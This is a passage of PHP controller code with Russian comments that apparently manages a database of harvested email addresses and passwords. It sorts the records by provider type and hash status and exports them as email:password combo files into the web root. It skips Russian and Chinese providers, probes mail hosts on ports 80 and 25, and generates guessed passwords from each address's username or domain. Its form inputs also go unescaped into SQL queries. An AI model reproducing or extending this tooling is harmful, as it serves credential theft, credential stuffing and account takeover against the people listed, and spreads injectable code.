			$domen = $domen.'_count_'.$count[0][0]['count(meiler)'];
			if(isset($hashtype)){
				$domen .='_hash_'.$hashtype;
				
			}

			
			header('Content-type: application/txt');
			header("Content-Disposition: attachment; filename='{$domen}.txt'");
			echo "$z";
			
			
			
			///////////////////////////////////////////////////////	
			//по дефолту если 
		}else
		{
			
			
			$data = $this->Filed->query("SELECT meiler FROM  `mails` GROUP BY meiler order by count(meiler) DESC limit 10");
			
			
			
			$p  = array();
			
			
			$p['sdate'] = $this->Filed->query("SELECT date FROM  `mails` group by date ");
			$p['podate'] = $this->Filed->query("SELECT date FROM  `mails` group by date DESC");
			
			foreach ($data as $d)
			{

				$z = $d['mails']['meiler'];

				$z = trim($z);
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND pass !='0' ");
				
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND hashtype != '0' AND pass !='0' ");
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}' AND hashtype = '0' AND pass !='0'" );
				
				$p[$z][] = $this->Filed->query("SELECT  count(meiler)  FROM  `mails` WHERE meiler = '{$z}'" );
				
				
				//echo '<pre>';
				//print_r($p);
				//echo '</pre>';
				//exit;
				
			}
			
			

			
			$this->set('data',$p);
		}
		
	}	
	
	/////////////Складывание скачанных мыл в папку по датам/////////////
	
	function dump_reset(){
		
		$this->Post->query("UPDATE  `mails` SET  `down` = 0 WHERE  `down` =1");
		
	}
	
	function dump_count(){
		
		$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=1 ");
		
		$this->d($c0);
		
	}
	
	function dumpfile(){
		
		$this->timeStart = $this->start('dumpfile',1);
		$p['sdate'] = $this->Post->query("SELECT date FROM  `mails` WHERE `down`=0 group by date ");
		//$p['podate'] = $this->Post->query("SELECT date FROM  `mails` group by date DESC");
		
		
		//$this->d($p);
		
		foreach($p['sdate'] as $ku)
		{
			$this->d($ku['mails']['date']); 
			$date_one = $ku['mails']['date'];
			$date_one  = trim($date_one );
			
			$rr = rand(1,9999);
			
			
			
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data", 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one, 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/corp', 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/big', 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/sred', 0777);
			
			/////////////////////////////////////////////////
			/////////////////БИГИ/////////////////
			/////////////////////////////////////////////////
			
			$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='big' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='big' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$this->d($c0,'bigNoHash');
			
			foreach($data0 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] = strtolower($d['mails']['email']);
				
				
				if(preg_match('/163.com/',$d['mails']['email']))continue;
				if(preg_match('/163.net/',$d['mails']['email']))continue;
				if(preg_match('/126.com/',$d['mails']['email']))continue;
				if(preg_match('/qq.com/',$d['mails']['email']))continue;
				if(preg_match('/.ru/',$d['mails']['email']))continue;
				if(preg_match('/ /',$d['mails']['pass']))continue;
				if(preg_match('/	/',$d['mails']['pass']))continue;
				if(preg_match('/http/',$d['mails']['pass']))continue;
				
				
				
				if(preg_match('/TR/',$d['mails']['pass']) AND strlen($d['mails']['pass'])<8)continue;
				
				$z0 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z0 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/big/'.$date_one.'_Nohash_big.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z0,FILE_APPEND); 
			
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			
			$data1 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='big' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$c1 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='big' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$this->d($c1,'bigHash');
			
			foreach($data1 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] =strtolower($d['mails']['email']);
				
				if(preg_match('/163.com/',$d['mails']['email']))continue;
				if(preg_match('/163.net/',$d['mails']['email']))continue;
				if(preg_match('/126.com/',$d['mails']['email']))continue;
				if(preg_match('/qq.com/',$d['mails']['email']))continue;
				if(preg_match('/.ru/',$d['mails']['email']))continue;
				if(preg_match('/ /',$d['mails']['pass']))continue;
				if(preg_match('/http/',$d['mails']['pass']))continue;
				if(preg_match('/	/',$d['mails']['pass']))continue;
				
				if(preg_match('/TR/',$d['mails']['pass']) AND strlen($d['mails']['pass'])<8)continue;
				
				$z1 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z1 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/big/'.$date_one.'_Hash_big.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z1,FILE_APPEND);
			
			
			
			
			
			/////////////////////////////////////////////////
			/////////////////CРЕДНИЕ/////////////////
			/////////////////////////////////////////////////
			
			$data2 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='sred' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$c2 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='sred' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$this->d($c2,'sredNoHash');
			
			foreach($data2 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] =strtolower($d['mails']['email']);
				$z2 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z2 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/sred/'.$date_one.'_Nohash_sred.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z2,FILE_APPEND); 
			
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			
			$data3 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='sred' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$c3 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='sred' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$this->d($c3,'sredHash');
			
			foreach($data3 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] =strtolower($d['mails']['email']);
				$z3 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z3 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/sred/'.$date_one.'_Hash_sred.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z3,FILE_APPEND);
			
			
			/////////////////////////////////////////////////
			/////////////////КОРПЫ/////////////////
			/////////////////////////////////////////////////
			
			$data4 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='corp' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$c4 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='corp' AND pass !='0' AND hashtype ='0' LIMIT 100000");
			
			$this->d($c4,'corpNoHash');
			
			foreach($data4 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] =strtolower($d['mails']['email']);
				$z4 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z4 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/corp/'.$date_one.'_Nohash_corp.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z4,FILE_APPEND); 
			
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			/////////////////////////////////////////////////
			
			$data5 = $this->Filed->query("SELECT * FROM  `mails` WHERE `down`=0 AND date = '$date_one' AND type='corp' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$c5 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = '$date_one' AND type='corp' AND pass !='0' AND hashtype !='0' LIMIT 100000");
			
			$this->d($c5,'corpHash');
			
			foreach($data5 as $d)
			{
				$mmm = $d['mails']['id'];
				$this->Post->query("UPDATE  `mails` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails']['email'] =strtolower($d['mails']['email']);
				$z5 .= $d['mails']['email'].':'.$d['mails']['pass'];			
				$z5 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data/".$date_one.'/corp/'.$date_one.'_Hash_corp.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z5,FILE_APPEND);
			
			
			
			
			$c1 = count($data1);
			$c2 = count($data2);
			$c3 = count($data3);
			$c4 = count($data4);
			$c5 = count($data5);
			
			
			if($c1 !=0 or $c2 !=0 or $c3 !=0 or $c4 !=0 or $c5 !=0 ){
				$this->d('stop1');
				
				$this->d($c2,'c2');
				$this->d($c3,'c3');
				$this->d($c4,'c4');
				$this->d($c5,'c5');
				$this->stop();
				exit;
				
			}
			
			
			
			
			
		}
		
		
		
		$this->stop();
	}
	
	
	function dump_reset2(){
		
		$this->Post->query("UPDATE  `mails_one` SET  `down` = 0 WHERE  `down` =1");
		
	}
	
	function dump_count2(){
		
		$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `down`=1 ");
		
		$this->d($c0);
		
	}
	
	function dumpfile2(){
		
		$this->timeStart = $this->start('dumpfile2',1);
		$p['sdate'] = $this->Post->query("SELECT date FROM  `mails_one` WHERE `down`=0 group by date ");
		//$p['podate'] = $this->Post->query("SELECT date FROM  `mails` group by date DESC");
		
		
		//$this->d($p);
		
		foreach($p['sdate'] as $ku)
		{
			$this->d($ku['mails_one']['date']); 
			$date_one = $ku['mails_one']['date'];
			$date_one  = trim($date_one );
			
			
			
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data2", 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one, 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/corp', 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/big', 0777);
			mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/sred', 0777);
			
			/////////////////////////////////////////////////
			/////////////////БИГИ/////////////////
			/////////////////////////////////////////////////
			
			$data0 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE `down`=0 AND date = '$date_one' AND type='big' LIMIT 100000");
			
			$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = '$date_one' AND type='big' LIMIT 100000");
			
			$rr = rand(1,9999);
			
			$this->d($c0,'BIGS');
			
			foreach($data0 as $d)
			{
				$mmm = $d['mails_one']['id'];
				$this->Post->query("UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
				
				
				if(preg_match('/163.com/',$d['mails_one']['email']))continue;
				if(preg_match('/163.net/',$d['mails_one']['email']))continue;
				if(preg_match('/126.com/',$d['mails_one']['email']))continue;
				if(preg_match('/qq.com/',$d['mails_one']['email']))continue;
				if(preg_match('/.ru/',$d['mails_one']['email']))continue;
				
				
				
				
				$z0 .= $d['mails_one']['email'];			
				$z0 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/big/'.$date_one.'.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z0,FILE_APPEND); 
			
			
			
			
			/////////////////////////////////////////////////
			/////////////////CРЕДНИЕ/////////////////
			/////////////////////////////////////////////////
			
			$data2 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE `down`=0 AND date = '$date_one' AND type='sred' LIMIT 100000");
			
			$c2 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = '$date_one' AND type='sred' LIMIT 100000");
			
			$this->d($c2,'sred');
			
			foreach($data2 as $d)
			{
				$mmm = $d['mails_one']['id'];
				$this->Post->query("UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails_one']['email'] =strtolower($d['mails_one']['email']);
				$z2 .= $d['mails_one']['email'];			
				$z2 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/sred/'.$date_one.'.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z2,FILE_APPEND); 
			
			
			
			
			/////////////////////////////////////////////////
			/////////////////КОРПЫ/////////////////
			/////////////////////////////////////////////////
			
			$data4 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE `down`=0 AND date = '$date_one' AND type='corp'  LIMIT 100000");
			
			$c4 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = '$date_one' AND type='corp' LIMIT 100000");
			
			$this->d($c4,'corp');
			
			foreach($data4 as $d)
			{
				$mmm = $d['mails_one']['id'];
				$this->Post->query("UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =".$mmm);
				
				$d['mails_one']['email'] =strtolower($d['mails_one']['email']);
				$z4 .= $d['mails_one']['email'];			
				$z4 .= "\r\n";
				
			}
			
			$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/data2/".$date_one.'/corp/'.$date_one.'.txt';
			
			$this->d($filename);
			
			file_put_contents($filename,$z4,FILE_APPEND); 
			
			
			
			$c0 = count($data0);
			$c2 = count($data2);
			$c4 = count($data4);
			
			
			
			if($c0 !=0 or $c2 !=0 or $c4 !=0 )
			{
				$this->d('stop2');
				
				$this->d($c0,'c0');
				$this->d($c2,'c2');
				$this->d($c4,'c4');
				
				$this->stop();
				exit;
				
			}
			
			
			
			
			
		}
		
		
		
		$this->stop();
	}
	
	function ping($host, $port, $timeout) { 
		$host = str_replace('http://','',$host);
		$tB = microtime(true); 
		$fP = fSockOpen($host, $port, $errno, $errstr, $timeout); 
		if (!$fP) { return "down"; } 
		$tA = microtime(true); 
		return round((($tA - $tB) * 1000), 0)." ms"; 
	}
	
	function cleanmail(){ //удаляет хосты ну которые ваще не пингуются
		
		
		$this->timeStart = $this->start('cleanmail',1);
		
		$ret =$this->Post->query("show columns FROM `mails` where `Field` = 'clean'");
		
		if($ret[0]['COLUMNS']['Field']=='clean'){
			$this->d($ret,'clean good');
		}else{
			$this->d('clean no, sozdaem');
			$this->Post->query("ALTER TABLE mails ADD clean int(3) NOT NULL DEFAULT '0'");
		}
		
		
		
		
		
		$p= $this->Post->query("SELECT * FROM  `mails` WHERE `clean`=0 AND (type='corp' or type='sred') limit 50");
		
		
		
		
		
		foreach($p as $ku)
		{
			//$this->d($ku);
			
			
			$this->d($ku['mails']['meiler']); 
			$domen = $ku['mails']['meiler'];
			$type =  $ku['mails']['type'];
			$domen = trim($domen);
			
			$ping = $this->ping($domen,'80','15');
			
			$this->d($ping,$domen.'-'.$type);
			
			if( $ping !='down')
			{
				$this->Post->query("UPDATE  `mails` SET  `clean` = 1 WHERE  `meiler` ='".$domen."'");
				
			}else
			{
				$ping2 = $this->ping($domen,'25','10');
				$this->d($ping2,$domen.' ping 2');
				
				if( $ping2 =='down')
				{
					
					$p2= $this->Post->query("SELECT * FROM  `mails` WHERE `meiler`='$domen'");
					foreach($p2 as $ku2)
					{
						$this->d($ku2['mails']['email'].':'.$ku2['mails']['pass']);
						
						$z0 = $ku2['mails']['email'].':'.$ku2['mails']['pass']."\r\n";
						
						//file_put_contents('delete.txt',$z0,FILE_APPEND); 
						
						//$this->Filed->query("DELETE FROM `mails` WHERE `email` ='".$ku2['mails']['email']."'");
						
						
					}
				}else{
					
					$this->Post->query("UPDATE  `mails` SET  `clean` = 1 WHERE  `meiler` ='".$domen."'");
					$this->d('25 port GOOD !!!'.$domen);
				}
				
			}
		}
		
		
		
		$this->stop();
	}
	
	
	function domens(){  //функция основная
		
		
		
		if($this->params['form']['down'] !='' or $this->params['form']['down2'] !='' or  $this->params['form']['down3'] !=''  or  $this->params['form']['down4'] !='' or $this->params['form']['onedomen'] !=''  or $this->params['form']['down5'] !=''  or $this->params['form']['down6'] !=''   or $this->params['form']['onedomen_one'] !=''   or $this->params['form']['onedomen_one2'] !='')
		{
			
			$this->d($this->params['form']);
			
			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			
			
			$sdate_one  = $this->params['form']['sdate_one'];
			$podate_one = $this->params['form']['podate_one'];
			
			$domen = trim($this->params['form']['domen']);
			$zona = trim($this->params['form']['zona']);
			
			$zona_meiler = trim($this->params['form']['zona_meiler']);
			
			$dom_pass = trim($this->params['form']['dom_pass']);
			$dom_pass2 = trim($this->params['form']['dom_pass2']);
			
			$dom_pass_one = trim($this->params['form']['dom_pass_one']);
			$dom_pass2_one = trim($this->params['form']['dom_pass2_one']);
			
			$corp_big = trim($this->params['form']['corp_big']);
			$corp_big_one = trim($this->params['form']['corp_big_one']);
			$corp_big_one2 = trim($this->params['form']['corp_big_one2']);
			
			$type = $this->params['form']['type'];
			$site = $this->params['form']['site'];
			$site_one = $this->params['form']['site_one'];
			$z0 = '';
			
			$ru_emails = $this->params['form']['ru_emails'];
			$ru_emails2 = $this->params['form']['ru_emails2'];
			
			
			
			//echo $type;
			if($domen !='' and $this->params['form']['down'] !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `meiler` like '%$domen%'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `date` >= '$sdate' AND `date` <= '$podate' AND `meiler` like '%$domen%'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $domen.' count: '.$count;
				$str = $z0;
				
				

			}
			
			
			if($zona =="*" AND $this->params['form']['down2'] !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					if($zona_meiler !=''){
						
						if($zona_meiler =='mail.ru'){
							
							$ku = " AND `meiler` !='$zona_meiler' AND `meiler` !='list.ru' AND `meiler` !='bk.ru' AND `meiler` !='inbox.ru'";
						}else{
							$ku = " AND `meiler` !='$zona_meiler'";
						}
						
						$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' $ku");
						
						$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' $ku");
						
						
						$data01 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND `meiler` !='$zona_meiler' $ku");
						
						$c01 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND `meiler` !='$zona_meiler' $ku");
						
					}else{
						
						$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate'");
						
						$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate'");
						
						
						$data01 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one'");
						
						$c01 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one'");
					}
					
					
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							//$z0 .= ":";
							//$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
					
					foreach($data01 as $d1)
					{
						$z0 .= $d1['mails_one']['email'];
						
						if($d1['mails_one']['pass'] !=0)
						{
							//$z0 .= ":";
							//$z0 .= $d1['mails_one']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					$count = $c01[0][0]['count(*)'];
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $count+$c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $type." s $sdate po $podate count: ".$count;
				$str = $z0;
				

			}
			
			
			if($corp_big_one =="corp" AND $this->params['form']['down4'] !='')
			{
				
				
				
				$data0 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp'");
				
				$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp'");
				
				
				
				foreach($data0 as $d)
				{
					
					$d['mails_one']['email'] =strtolower($d['mails_one']['email']);
					
					if($dom_pass_one == 'ku_one')
					{
						$z0 .= $d['mails_one']['email'];
						$z0 .= ":";
						@$bb = explode('@',$d['mails_one']['email']);
						$z0 .= $bb[0];
						$z0 .= "\r\n";
						
					}
					
					elseif($dom_pass2_one == 'ku2_one')
					{
						$z0 .= $d['mails_one']['email'];
						$z0 .= ":";
						@$bb = explode('@',$d['mails_one']['email']);
						@$kk = explode('.',$bb[1]);
						@$z0 .= $kk[0];
						$z0 .= "\r\n";
						
					}else{
						
						$z0 .= $d['mails_one']['email'];
						
						
						$z0 .= "\r\n";
					}
					

				}
				
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				
				
				$all = $corp_big_one." s $sdate_one po $podate_one count: ".$count;
				$str = $z0;
				
				
			}
			
			
			if($corp_big_one =="sred" AND $this->params['form']['down4'] !='')
			{
				
				
				$data0 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred'");
				
				$c0 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='sred'");
				
				
				
				foreach($data0 as $d)
				{
					$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
					
					$z0 .= $d['mails_one']['email'];
					
					
					$z0 .= "\r\n";

				}
				
				
				
				
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $corp_big_one." s $sdate po $podate count: ".$count;
				$str = $z0;
				
				
			}
			
			
			if($corp_big =="corp" AND $this->params['form']['down3'] !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='corp'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0' AND type='corp'");
					
					
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
						
						if($dom_pass == 'ku')
						{
							$z0 .= $d['mails']['email'];
							$z0 .= ":";
							@$bb = explode('@',$d['mails']['email']);
							$z0 .= $bb[0];
							$z0 .= "\r\n";
							
						}
						
						if($dom_pass2 == 'ku2')
						{
							$z0 .= $d['mails']['email'];
							$z0 .= ":";
							@$bb = explode('@',$d['mails']['email']);
							@$kk = explode('.',$bb[1]);
							@$z0 .= $kk[0];
							$z0 .= "\r\n";
							
						}
						
						
						
						

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='corp'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0' AND type='corp'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='corp'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND type='corp'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='corp'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND type='corp'");
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
					$data1 = $this->Filed->query("SELECT * FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp'");
					
					$c1 = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE date >= '$sdate_one' AND date <= '$podate_one' AND type='corp'");
					
					
					
					foreach($data1 as $d2)
					{
						$z0 .= $d2['mails']['email'];
						
						
						$z0 .= "\r\n";

					}
					
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
